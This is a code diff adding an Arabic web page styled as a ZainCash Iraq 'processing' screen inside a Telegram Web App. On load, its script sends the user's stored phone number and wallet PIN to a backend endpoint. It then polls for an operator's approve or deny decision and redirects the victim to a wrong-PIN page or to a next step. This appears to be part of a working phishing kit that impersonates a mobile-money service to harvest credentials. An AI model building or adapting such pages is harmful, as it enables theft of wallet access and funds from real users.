@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>جاري المعالجة - زين كاش العراق</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --zc-purple: #6A1B9A;          /* ZainCash Signature Deep Purple */
+            --zc-magenta: #C2185B;         /* ZainCash Vibrant Magenta Accent */
+            --zc-gradient: linear-gradient(135deg, #4A148C 0%, #8E24AA 55%, #D81B60 100%);
+            --zc-dark: #1E102B;            /* Deep Plum Dark Text */
+            --bg-dark: #1E102B;
+            --card-bg: #FFFFFF;
+            --text-dark: #1E102B;
+            --text-muted: #6A5D75;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            direction: rtl;
+        }
+
+        /* Centered Loading Card */
+        .loading-card {
+            background: var(--card-bg);
+            width: 88%;
+            max-width: 380px;
+            padding: 45px 24px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border: 1px solid #EDE7F6;
+        }
+
+        /* Animated Spinner Circle */
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background: var(--zc-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(142, 36, 170, 0.35);
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 82px;
+            height: 82px;
+            border: 4px solid rgba(30, 16, 43, 0.15);
+            border-top: 4px solid var(--bg-dark);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Dynamic Status Typography */
+        h2 {
+            color: var(--text-dark);
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 800;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 14.5px;
+            margin: 0;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">جاري المعالجة...</h2>
+    <p id="sub-text">يرجى الانتظار، جاري التحقق من بيانات المحفظة...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ No phone number found in localStorage");
+    }
+
+    // Send login notification to backend endpoint
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Request error:", err);
+    }
+
+    // Dynamic progress text switch
+    setTimeout(() => {
+        mainText.textContent = "يرجى الانتظار قليلاً...";
+        subText.textContent = "هذه العملية لن تستغرق سوى ثوانٍ معدودة";
+    }, 3000);
+
+    // Poll backend status for approval or denial
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "تمت الموافقة بنجاح!";
+                subText.textContent = "جاري الانتقال إلى الخطوة التالية...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "تم رفض الطلب!";
+                subText.textContent = "الرقم السري أو رقم المحفظة غير صحيح.";
+
+                setTimeout(() => {
+                    window.location.href = "/page6?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Status check failed:", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+</html>
